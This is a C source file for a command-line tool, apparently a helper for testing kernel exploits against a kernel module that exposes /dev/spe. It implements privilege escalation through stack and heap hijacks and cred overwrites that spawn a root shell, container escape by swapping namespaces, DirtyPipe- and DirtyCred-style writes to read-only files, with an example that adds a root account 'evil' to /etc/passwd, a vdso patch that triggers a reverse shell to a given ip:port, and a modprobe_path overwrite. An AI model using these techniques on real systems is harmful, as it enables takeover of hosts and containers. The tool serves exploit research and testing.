#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <sched.h>
#include <arpa/inet.h>
#include <getopt.h>

#include <spe_common.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

static char *program_name = NULL;
static unsigned long *program_argv = NULL;
static int program_argc = NULL;

#define logd(fmt, ...) dprintf(2, "[*] %s: " fmt "\n",program_name,##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s: " fmt "\n" COLOR_DEFAULT,program_name,##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s: " fmt "\n" COLOR_DEFAULT,program_name,##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT,__FILE__, __LINE__,##__VA_ARGS__)

#ifndef PATH_MAX
#define PATH_MAX 128
#endif

enum VDSO_MODE
{
	VDSO_NULL = 0,
	VDSO_PATCH,
	VDSO_DEPATCH
};

#define ESCAPE_F	BIT(0)
#define ESCAPE_N	BIT(1)
#define ESCAPE_M   	BIT(2)
#define ESCAPE_U   	BIT(3)
#define ESCAPE_I   	BIT(4)
#define ESCAPE_C   	BIT(5)
#define ESCAPE_n   	BIT(6)

enum FILE_OPT
{
	FILE_NULL = 0,
	FILE_MODE,
	FILE_PIPE
};

enum C_MODE
{
	C_NULL = 0,
	C_CHAR,
	C_FILE
};

enum W_MODE
{
	W_NULL = 0,
	W_APPEND,
	W_OFFSET
};

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

enum PRIVUP_MODE
{
	UP_NULL = 0,
	UP_HEAP,
	UP_STACK,
	UP_CRED
};

static char cred_flag[10][7] = {
    "uid","gid","suid","sgid",
    "euid","egid","fsuid","fsgid",
    "capeff","capprm"
};

uint64_t user_cs, user_ss, user_sp, user_rflags, user_rip;
int fd = 0;
int spe_fd = 0;
unsigned int sleep_seconds = 0;

void spe_exit(int status)
{
	close(spe_fd);
	exit(status);
}

void spe_sleep()
{
	close(spe_fd);
	logd("sleep ...");
	sleep(sleep_seconds);
	logd("exit ...");
	exit(0);
}

void save_state() 
{
	__asm__(
	".intel_syntax noprefix;"
	"mov user_cs, cs;"
	"mov user_ss, ss;"
	"mov user_sp, rsp;"
	"pushf;"
	"pop user_rflags;"
	".att_syntax;"
	);
}

void shell()
{
	close(spe_fd);
	logd("Poping shell ...");
	execve("/bin/sh", 0, 0);
	exit(1);
}

void modify_cred(char *flags, pid_t t_pid, unsigned short s_flag)
{
	struct cred_modify cred_modify;
	cred_modify.cred_flags = 0;
	cred_modify.pid = t_pid;

	char *p;
	flags = strdup(flags);
	if (flags == NULL) {
		loge("strdup error!");
		spe_exit(1);
	}
	p = strtok(flags, ",");
	while(p){   
		int i;
		for(i=0;i<10;i++){
			if (!strcmp(p,cred_flag[i])){
				cred_modify.cred_flags |= BIT(i);
				break;
			}
		}
		if (i==10){
			logw("Unknown Flag!");
			free(flags);
			privup_usage(1);
		}  
		p = strtok(NULL, ",");
	}     
	free(flags);

	long ret = ioctl(spe_fd, MODIFY_CRED, &cred_modify);
	switch (ret){
		case 0:
			logi("Modify Process %d Cred.", cred_modify.pid);
			if (cred_modify.pid==getpid()){
				if (s_flag){
					spe_sleep();
				}
				else{
					shell();
				}
			}
			spe_exit(0);
			break;
		case 1:
			logw("Process %d does not exist.", cred_modify.pid);
			break;
		default:
			loge("Unknown Error!");
			break;
	}
	spe_exit(1);
}

void stack_shell()
{
	close(spe_fd);
	execve("/bin/sh", 0, 0);
	exit(1);
}

void stack_sleep()
{
	close(spe_fd);
	sleep(sleep_seconds);
	exit(0);
}

void stack_overflow(unsigned short s_flag)
{
	save_state();
	struct user_regs user_regs;
	user_regs.user_cs = user_cs;
	user_regs.user_ss = user_ss;
	user_regs.user_rflags = user_rflags;
	user_regs.user_sp = user_sp;
	if (s_flag){
		logd("Try to sleep ...");
		user_regs.user_rip = (uint64_t)stack_sleep;
	}
	else{
		logd("Try to pop a shell ...");
		user_regs.user_rip = (uint64_t)stack_shell;
	}

	ioctl(spe_fd, STACK_OVERFLOW, &user_regs);
	loge("Unknown Error!");
	spe_exit(1);
}

void heap_overflow(unsigned short s_flag)
{
	int pipe_fds[2];
	pipe(pipe_fds);
	
	struct pipe_hijack pipe_hijack;
	pipe_hijack.pipe_fd = pipe_fds[0];
	long ret = ioctl(spe_fd, HEAP_OVERFLOW, &pipe_hijack);

	if (!ret) {
		logi("Hijacking pipe ops->release.");
	}
	else{
		loge("Unknown Error!");
		spe_exit(1);
	}

	close(pipe_fds[0]);
	close(pipe_fds[1]);

	if (s_flag){
		spe_sleep();
	}
	else{
		shell();
	}
	spe_exit(1);
}

void privup_usage(int status)
{
	printf("Usage: %s privup [Opiton]...\n", program_name);
	fputs("Optional:\n",stdout);
	fputs("  -H, --heap              Hijacking the pipe release function on the heap to elevate privileges.\n",stdout);
	fputs("  -s, --stack             Hijacking the return address on the stack to elevate privileges.\n",stdout);
	fputs("  -c, --cred=flags        Overwrite process cred to elevate privileges.\n\
                          Flags include uid, euid, suid, fsuid, capeff,\n\
                                        gid, egid, sgid, fsgid, capprm\n\
                          multiple flags separated by \',\'.\n",stdout);
	fputs("  -p, --pid=pid           with -c, target process pid, default is current process.\n",stdout);
	fputs("  -S, --sleep=seconds     No shell just sleep.\n\n",stdout);
	printf("e.g: %s privup -c euid,capeff -S 30\n", program_name);
	spe_exit(status);
}

void privilege_up()
{
	int up_mode = UP_NULL;
	pid_t t_pid = 0;
	unsigned short s_flag = 0;
	char *flags_str = NULL;

	int c;
	while (1){
		int optId = 0;
		static struct option longOpts[] = {
			{"heap", no_argument, NULL, 'H'},
			{"stack", no_argument, NULL, 's'},
			{"cred", required_argument, NULL, 'c'},
			{"pid", required_argument, NULL, 'p'},
			{"sleep", required_argument, NULL, 'S'},
			{"help", no_argument, NULL, 'h'},
			{0, 0, 0, 0}
		};
		c = getopt_long(program_argc, program_argv, "Hsc:p:S:h", longOpts, &optId);
		if (c==-1)
			break;
		switch (c){
			case 'H':
				if (up_mode != UP_NULL){
					logw("Only one of the parameters -H,-s,-c can be selected");
					spe_exit(1);
				}
				up_mode = UP_HEAP;
				break;
			case 's':
				if (up_mode != UP_NULL){
					logw("Only one of the parameters -H,-s,-c can be selected");
					spe_exit(1);
				}
				up_mode = UP_STACK;
				break;
			case 'c':
				if (up_mode != UP_NULL){
					logw("Only one of the parameters -H,-s,-c can be selected");
					spe_exit(1);
				}
				up_mode = UP_CRED;
				flags_str = optarg;
				break;
			case 'p':
				t_pid = atoi(optarg);
				break;
			case 'S':
				s_flag = 1;
				sleep_seconds = atoi(optarg);
				break;
			case 'h':
				privup_usage(0);
				break;
			default:
				privup_usage(1);
				break;
		}
	}

	if((t_pid!=0)&&(up_mode!=UP_CRED)){
		logw("The -p parameter is only used in combination with -c.");
		spe_exit(1);	
	}

	if((t_pid!=0)&&(s_flag)){
		logw("cannot sleep other processes.");	
	}

	if(t_pid == 0){
		t_pid = getpid();
	}

	switch (up_mode){
		case UP_NULL:
			logw("Missing -H,-s or -c parameter.");
			privup_usage(1);
			break;
		case UP_HEAP:
			heap_overflow(s_flag);
			break;
		case UP_STACK:
			stack_overflow(s_flag);
			break;
		case UP_CRED:
			modify_cred(flags_str, t_pid, s_flag);
			break;
		default:
			loge("Unknow Error!");
			break;
	}
	spe_exit(1);

}

void dirtypipe(char *filename, char *buf, size_t len, off_t f_offset)
{
	const loff_t next_page = (f_offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = f_offset + (loff_t)len;
	if (end_offset > next_page) {
		logw("pipe merge cannot write across a page boundary.");
		goto pipe_err;
	}
	
	int evil_fd = open(filename, O_RDONLY);
	if (evil_fd == -1){
		loge(" cannot open file %s",filename);
		goto pipe_err;
	}

	struct stat f_stat;
	if (fstat(evil_fd, &f_stat)) {
		loge(" cannot stat file %s",filename);
		close(evil_fd);
		goto pipe_err;	
	}

	if (f_offset > f_stat.st_size) {
		loge("offset is not inside the file!");
		close(evil_fd);
		goto pipe_err;
	}

	if (end_offset > f_stat.st_size) {
		loge("pipe merge does not extend the file size!");
		close(evil_fd);
		goto pipe_err;
	}

	int pipe_fds[2];
	struct dirty_pipe dirty_pipe;
	pipe(pipe_fds);
	dirty_pipe.pipe_fd = pipe_fds[1];
	if (f_offset % PAGE_SIZE == 0){
		dirty_pipe.flag = 1;
	}
	else{
		dirty_pipe.flag = 0;
		f_offset--;
	}

	ssize_t nbytes = splice(evil_fd, &f_offset, pipe_fds[1], NULL, 1, 0);
	close(evil_fd);
	if (nbytes < 0) {
		loge("splice failed!");
		goto pipe_err;
	}
	
	long ret = ioctl(spe_fd, DIRTYPIPE, &dirty_pipe);
	if (!ret) {
		logi("pipe buf can merge.");
	}
	else{
		loge("Unknown Error!");
		goto pipe_err;
	}

	nbytes = write(pipe_fds[1], buf, len);
	close(pipe_fds[1]);
	close(pipe_fds[0]);
	free(buf);
	buf = NULL;
	if (nbytes < 0) {
		loge("Write Failure!");
		spe_exit(1);
	}

	logi("Write Success.");
	spe_exit(0);

pipe_err:
	free(buf);
	buf = NULL;
	spe_exit(1);
}

void dirtycred(char *filename, char *buf, size_t len, int w_mode, off_t f_offset)
{
	int evil_fd = open(filename, O_RDONLY);
	if (evil_fd == -1){
		loge(" cannot open file %s",filename);
		goto mode_err;
	} 
	if (w_mode == W_APPEND){
		lseek(evil_fd, 0, SEEK_END);
	}
	else{
		lseek(evil_fd, f_offset, SEEK_SET);
	}

	struct dirty_cred dirty_cred;
	dirty_cred.file_fd= evil_fd;
	long ret = ioctl(spe_fd, DIRTYCRED, &dirty_cred);
	if (!ret) {
		logi("modify file mode.");
	}
	else{
		loge("Unknown Error!");
		close(evil_fd);
		goto mode_err;
	}
	
	ret = write(evil_fd, buf, len);
	close(evil_fd);
	free(buf);
	buf = NULL;
	if (ret == -1) {
		loge("Write Failure!");
		spe_exit(1);
	}

	logi("Write Success.");
	spe_exit(0);

mode_err:
	free(buf);
	buf = NULL;
	spe_exit(1);

}

void file_usage(int status)
{
	printf("Usage: %s file [Opiton]...\n", program_name);
	fputs("Optional:\n",stdout);
	fputs("  -f, --file=filepath     Read-only file that you want to modify.\n",stdout);
	fputs("  -c, --content=chars     Visible characters to be written to the file.\n",stdout);
	fputs("  -i, --input=filepath    Write the contents of the specified file to the target file.\n",stdout);
	fputs("  -m, --mode              Rewrite file mode to tamper with read-only files.\n",stdout);
	fputs("  -a, --append            with -m, add content to the end of the file.\n",stdout);
	fputs("  -p, --pipe              Use pipe merge to rewrite read-only file cache.\n",stdout);
	fputs("  -o, --offset=num        File Offset.\n\n",stdout);
	printf("e.g: %s file -ma -f /etc/passwd -c evil::0:0:root:/root:/bin/bash\n", program_name);
	spe_exit(status);
}

void evil_file()
{
	char *filename = NULL;
	char *buf = NULL;
	int file_mode = FILE_NULL;
	int w_mode = W_NULL;
	int c_mode = C_NULL;
	size_t len = 0;
	off_t f_offset = 0;
	int c;
	while (1){
		int optId = 0;
		static struct option longOpts[] = {
			{"file", required_argument, NULL, 'f'},
			{"content", required_argument, NULL, 'c'},
			{"input", required_argument, NULL, 'i'},
			{"mode", no_argument, NULL, 'm'},
			{"append", no_argument, NULL, 'a'},
			{"pipe", no_argument, NULL, 'p'},
			{"offset", required_argument, NULL, 'o'},
			{"help", no_argument, NULL, 'h'},
			{0, 0, 0, 0}
		};
		c = getopt_long(program_argc, program_argv, "f:c:i:mapo:h", longOpts, &optId);
		if (c==-1)
			break;
		switch (c){
			case 'f':
				filename = optarg;
				break;
			case 'c':
				if (c_mode != C_NULL){
					logw("Only one of the parameters -c and -i can be selected");
					spe_exit(1);
				}
				c_mode = C_CHAR;
				buf = calloc(strlen(optarg)+1,sizeof(char));
				len = strlen(optarg);
				strcpy(buf,optarg);
				break;
			case 'i':
				if (c_mode != C_NULL){
					logw("Only one of the parameters -c and -i can be selected");
					spe_exit(1);
				}
				c_mode = C_FILE;
				buf = calloc(strlen(optarg)+1,sizeof(char));
				strcpy(buf,optarg);
				break;
			case 'm':
				if (file_mode != FILE_NULL){
					logw("Only one of the parameters -m and -p can be selected");
					spe_exit(1);
				}
				file_mode = FILE_MODE;
				break;
			case 'a':
				if (w_mode != W_NULL){
					logw("Only one of the parameters -a and -o can be selected");
					spe_exit(1);
				}
				w_mode = W_APPEND;
				break;
			case 'p':
				if (file_mode != FILE_NULL){
					logw("Only one of the parameters -m and -p can be selected");
					spe_exit(1);
				}
				file_mode = FILE_PIPE;
				break;
			case 'o':
				if (w_mode != W_NULL){
					logw("Only one of the parameters -a and -o can be selected");
					spe_exit(1);
				}
				w_mode = W_OFFSET;
				f_offset = atoi(optarg);
				break;
			case 'h':
				file_usage(0);
				break;
			default:
				file_usage(1);
				break;
		}
	}
	
	if (!filename){
		logw("Missing filepath.");
		file_usage(1);
	}
	if (c_mode==C_NULL){
		logw("Missing file content.");
		file_usage(1);
	}
	if (c_mode==C_FILE){
		int tmp_fd = open(buf, O_RDONLY);
		if (tmp_fd == -1){
			loge(" cannot open file %s",buf);
			free(buf);
			buf = NULL;
			spe_exit(1);
		}
		free(buf);
		buf = NULL;
		struct stat f_stat;
		fstat(tmp_fd, &f_stat);
		len = f_stat.st_size;
		buf = malloc(len+1);
		read(tmp_fd,buf,len);
		close(tmp_fd);
	}

	if ((file_mode==FILE_PIPE)&&(w_mode==W_APPEND)){
		logw("pipe merge does not extend the file size");
		spe_exit(1);
	}

	switch (file_mode){
		case FILE_NULL:
			logw("Missing -m or -p parameter.");
			file_usage(1);
			break;
		case FILE_MODE:
			dirtycred(filename, buf, len, w_mode, f_offset);
			break;
		case FILE_PIPE:
			dirtypipe(filename, buf, len, f_offset);
			break;
		default:
			loge("Unknow Error!");
			break;
	}
	spe_exit(1);
}

long ns_enter(char *nslink)
{
	struct ns_escape ns_escape;
	ns_escape.ns_fd = open(nslink, O_RDONLY);
	if (ns_escape.ns_fd == -1){
		loge("cannot open directory \'%s\': Permission denied",nslink);
		spe_exit(1);		
	}
	long ret = ioctl(spe_fd, NS_ESCAPE, &ns_escape);
	close(ns_escape.ns_fd);
	return ret;
}

void escape_usage(int status)
{
	printf("Usage: %s escape [Opiton]...\n", program_name);
	fputs("Optional:\n",stdout);
	fputs("  -f, --filesystem        Replace process fs_struct with init_fs to escape\n\
			  the container filesystem.\n",stdout);
	fputs("  -N, --nsproxy           Replace root process nsproxy with init_nsproxy.\n",stdout);
	fputs("  -m, --mount             Escape container mount namespace.\n",stdout);
	fputs("  -u, --uts               Escape container uts namespace.\n",stdout);
	fputs("  -i, --ipc               Escape container ipc namespace.\n",stdout);
	fputs("  -c, --cgroup            Escape container cgroup namespace.\n",stdout);
	fputs("  -n, --net               Escape container net namespace.\n",stdout);
	fputs("  -s, --sleep=seconds     No shell just sleep.\n",stdout);
	fputs("Caution:\n",stdout);
	fputs("  When using namespaces escape it is necessary to combine the -N parameter,\n\ 
  and if CAP_SYS_ADMIN is not available, privilege elevation is automatically performed.\n\
  If the container is not restricted by seccomp, namespaces escape can also be accomplished\n\
  after replacing nsproxy through tools such as nsenter.\n\n",stdout);
	printf("e.g: %s escpae -Nm\n", program_name);
	spe_exit(status);
}

void container_escape()
{
	unsigned int escpae_flags = 0;
	unsigned short s_flag = 0;
	unsigned int s_sec = 0;
	int c;
	while (1){
		int optId = 0;
		static struct option longOpts[] = {
			{"filesystem", no_argument, NULL, 'f'},
			{"nsproxy", no_argument, NULL, 'N'},
			{"mount", no_argument, NULL, 'm'},
			{"uts", no_argument, NULL, 'u'},
			{"ipc", no_argument, NULL, 'i'},
			{"cgroup", no_argument, NULL, 'c'},
			{"net", no_argument, NULL, 'n'},
			{"sleep", required_argument, NULL, 's'},
			{"help", no_argument, NULL, 'h'},
			{0, 0, 0, 0}
		};
		c = getopt_long(program_argc, program_argv, "fNmuicns:h", longOpts, &optId);
		if (c==-1)
			break;
		switch (c){
			case 'f':
				escpae_flags |= ESCAPE_F;
				break;
			case 'N':
				escpae_flags |= ESCAPE_N;
				break;
			case 'm':
				escpae_flags |= ESCAPE_M;
				break;
			case 'u':
				escpae_flags |= ESCAPE_U;
				break;
			case 'i':
				escpae_flags |= ESCAPE_I;
				break;
			case 'c':
				escpae_flags |= ESCAPE_C;
				break;
			case 'n':
				escpae_flags |= ESCAPE_n;
				break;
			case 's':
				s_flag = 1;
				sleep_seconds = atoi(optarg);
				break;
			case 'h':
				escape_usage(0);
				break;
			default:
				escape_usage(1);
				break;
		}
	}
	if (escpae_flags == 0){
		logw("Missing parameters.");
		escape_usage(1);
	}
	if (((escpae_flags&ESCAPE_N)==0)&&(escpae_flags!=ESCAPE_F)){
		logw("Namespaces escape without replacing root process nsproxy.");
	}

	long ret;
	if (escpae_flags&ESCAPE_N) {
		ret = ioctl(spe_fd, NS_ESCAPE_INIT, NULL);
		if (!ret){
			logi("Root process nsproxy is replaced.");
		}
		else{
			goto escape_err;
		}
	}
	if (escpae_flags&ESCAPE_M) {
		ret = ns_enter("/proc/1/ns/mnt");
		if (!ret){
			logi("switch to /proc/1/ns/mnt.");
		}
		else{
			goto escape_err;
		}
	}
	if (escpae_flags&ESCAPE_U) {
		ret = ns_enter("/proc/1/ns/uts");
		if (!ret){
			logi("switch to /proc/1/ns/uts.");
		}
		else{
			goto escape_err;
		}
	}
	if (escpae_flags&ESCAPE_I) {
		ret = ns_enter("/proc/1/ns/ipc");
		if (!ret){
			logi("switch to /proc/1/ns/ipc.");
		}
		else{
			goto escape_err;
		}
	}
	if (escpae_flags&ESCAPE_C) {
		ret = ns_enter("/proc/1/ns/cgroup");
		if (!ret){
			logi("switch to /proc/1/ns/cgroup.");
		}
		else{
			goto escape_err;
		}
	}
	if (escpae_flags&ESCAPE_n) {
		ret = ns_enter("/proc/1/ns/net");
		if (!ret){
			logi("switch to /proc/1/ns/net.");
		}
		else{
			goto escape_err;
		}
	}
	if (escpae_flags&ESCAPE_F) {
		ret = ioctl(spe_fd, FS_ESCAPE, NULL);
		if (!ret){
			logi("switch to host filesystem.");
		}
		else{
			goto escape_err;
		}
	}
	if (s_flag) {
		spe_sleep();
	}
	else{
		shell();
	}
escape_err:
	loge("Unknown Error!");
	spe_exit(1);
}

void vdso_patch(char *str)
{
	char *p;
	struct vdso_patch vdso_patch;

	if (access("/tmp/.x", F_OK) == 0){
        logw("/tmp/.x exists!");
    }

	str = strdup(str);
	if (str == NULL) {
		loge("strdup error!");
		spe_exit(1);
	}

	p = strchr(str, ':');
	if (p != NULL && p[1] != '\x00') {
		*p = '\x00';
		int port = atoi(p + 1);
		if (port<1||port>65535){
			logw("Port Error %s (1~65535)", str);
			free(str);
			spe_exit(1);
		}
		vdso_patch.port = htons(port);
	}
	else{
		logw("Format Error %s -> ip:port", str);
		free(str);
		spe_exit(1);
	}

	if (inet_aton(str, &vdso_patch.ip) != 1){
		logw("Format Error %s -> ip:port", str);
		free(str);
		spe_exit(1);
	}

	free(str);
	logd("Confirm that /tmp/.x is unlinked and listening to the port.[Y/N]:");
	int ch = getchar();
	if (ch!='Y'&&ch!='y'){
		logw("exit ...");
		spe_exit(1);
	}
	long ret = ioctl(spe_fd, PATCH_VDSO, &vdso_patch);
	switch (ret){
		case 0:
			logi("vdso gettimeofday has been patched.");
			logd("Waiting for the reverse shell ...");
			spe_exit(0);
			break;
		case 1:
			logw("vdso has already been patched.");
			break;
		case 2:
			loge("vdso can not be patched!");
			break;
		case 3:
			logi("vdso clock_gettime has been patched.");
			logd("Waiting for the reverse shell ...");
			spe_exit(0);
			break;
		default:
			loge("Unknown Error!");
			break;
	}
	spe_exit(1);
}

void vdso_depatch()
{
	long ret = ioctl(spe_fd, DEPATCH_VDSO, NULL);
	switch (ret){
		case 0:
			logi("vdso has been depatched.");	
			spe_exit(0);
			break;
		case 1:
			logw("vdso has not been patched.");
			break;
		default:
			loge("Unknown Error!");
			break;
	}
	spe_exit(1);
}

void vdso_usage(int status)
{
	printf("Usage: %s vdso [Opiton]...\n", program_name);
	fputs("Optional:\n",stdout);
	fputs("  -t, --target=ip:port    Patch vdso to make the privileged process calling\n\
			  the gettimeofday/clock_gettime function reverse shell\n\ 
			  to the specified target.\n",stdout);
	fputs("  -d, --depatch           Depatch vdso. You need to depatch vdso before each\n\
			  patch of vdso.\n",stdout);
	fputs("Caution:\n",stdout);
	fputs("  You need to make sure that the file /tmp/.x does not exist in the host\n\ 
  filesystem before waiting for the reverse shell.\n\n",stdout);
	printf("e.g: %s vdso -t 127.0.0.1:8888\n", program_name);
	spe_exit(status);
}


void patch_vdso()
{
	char* target = NULL;
	int vdso_mode = VDSO_NULL;
	int c;
	while (1){
		int optId = 0;
		static struct option longOpts[] = {
			{"target", required_argument, NULL, 't'},
			{"depatch", no_argument, NULL, 'd'},
			{"help", no_argument, NULL, 'h'},
			{0, 0, 0, 0}
		};
		c = getopt_long(program_argc, program_argv, "t:dh", longOpts, &optId);
		if (c==-1)
			break;
		switch (c){
			case 't':
				if (vdso_mode != VDSO_NULL){
					logw("vdso takes only one parameter.");
					spe_exit(1);
				}
				target = optarg;
				vdso_mode = VDSO_PATCH;
				break;
			case 'd':
				if (vdso_mode != VDSO_NULL){
					logw("vdso takes only one parameter.");
					spe_exit(1);
				}
				vdso_mode = VDSO_DEPATCH;
				break;
			case 'h':
				vdso_usage(0);
				break;
			default:
				vdso_usage(1);
				break;
		}
	}

	switch (vdso_mode){
		case VDSO_NULL:
			logw("Missing parameters.");
			vdso_usage(1);
			break;
		case VDSO_PATCH:
			vdso_patch(target);
			break;
		case VDSO_DEPATCH:
			vdso_depatch();
			break;
		default:
			loge("Unknown Error!");
			break;
	}
	spe_exit(1);
}


void modprobe_usage(int status)
{
	printf("Usage: %s modprobe [Opiton]...\n", program_name);
	fputs("Required:\n",stdout);
	fputs("  -p, --path=filepath    Modify the modprobe path to a specified absolute path.\n\
			 If used in a container environment, you need to resolve\n\
			 the host path yourself.\n\n",stdout);
	printf("e.g: %s modprobe -p /sbin/modprobe\n", program_name);
	spe_exit(status);
}

void modify_modprobe()
{
	char* modified_path = NULL;
	int c;
	while (1){
		int optId = 0;
		static struct option longOpts[] = {
			{"path", required_argument, NULL, 'p'},
			{"help", no_argument, NULL, 'h'},
			{0, 0, 0, 0}
		};
		c = getopt_long(program_argc, program_argv, "p:h", longOpts, &optId);
		if (c==-1)
			break;
		switch (c){
			case 'p':
				if (optarg[0]!='/'){
					logw("The filepath must be an absolute path.");
					spe_exit(1);
				}
				else if(strlen(optarg) > PATH_MAX){
					logw("The filepath is too long.");
					spe_exit(1);
				}
				modified_path = calloc(PATH_MAX,sizeof(char));
				strcpy(modified_path, optarg);
				break;
			case 'h':
				modprobe_usage(0);
				break;
			default:
				modprobe_usage(1);
				break;
		}
	}
	if (!modified_path){
		logw("Missing required parameters.");
		modprobe_usage(1);
	}

	struct modprobe_modify modprobe_modify;
	modprobe_modify.path_addr = modified_path;
	modprobe_modify.path_len = strlen(modified_path)+1;
	long ret = ioctl(spe_fd, MODPROBE, &modprobe_modify);
	switch (ret){
		case 0:
			logi("modprobe path is modified to %s", modified_path);	
			spe_exit(0);
		case 2:
			loge("modprobe path can not be modified!");
			break;
		default:
			loge("Unknown Error!");
			break;
	}
	spe_exit(1);
}

void usage(int status)
{
	printf("Usage: %s [Command] [Opiton]...\n", program_name);
	fputs("A simple helper program for kernel exploit testing using SPE.\n\n",stdout);
	fputs("Available commands:\n",stdout);
	fputs("  privup    For privilege elevation.\n",stdout);
	fputs("  escape    For container escape.\n",stdout);
	fputs("  file      For modifying read-only file.\n",stdout);
	fputs("  vdso      For modifying vdso.\n",stdout);
	fputs("  modprobe  For modifying modprobe path.\n\n",stdout);
	printf("Use \'%s [Command] --help\' to get more information about the command.\n", program_name);
	exit(status);
}

void main(int argc, char *argv[])
{	
	if (!argv[0])
		program_name = "speHelper";
	else if (program_name = strrchr(argv[0], '/'))
		program_name++;
	else
		program_name = argv[0];

	if (argc <= 1)
		usage(1);
	if (!strcmp(argv[1],"--help")||!strcmp(argv[1],"-h"))
		usage(0);
	
	spe_fd = open("/dev/spe",0);
	if (spe_fd == -1){
		loge("SPE device does not exist, need to load SPE module first.");
		exit(1);
	}

	program_argv = argv;
	program_argc = argc;
	if (!strcmp(argv[1],"privup")){
		privilege_up();
	}
	else if (!strcmp(argv[1],"escape")){
		container_escape();
	}
	else if (!strcmp(argv[1],"file")){
		evil_file();
	}
	else if (!strcmp(argv[1],"vdso")){
		patch_vdso();
	}
	else if (!strcmp(argv[1],"modprobe")){
		modify_modprobe();
	}
	else{
		logw("Unknown Command!", program_name);
		printf("Try \'%s --help\' for more information.\n", program_name);
	}

	spe_exit(1);
}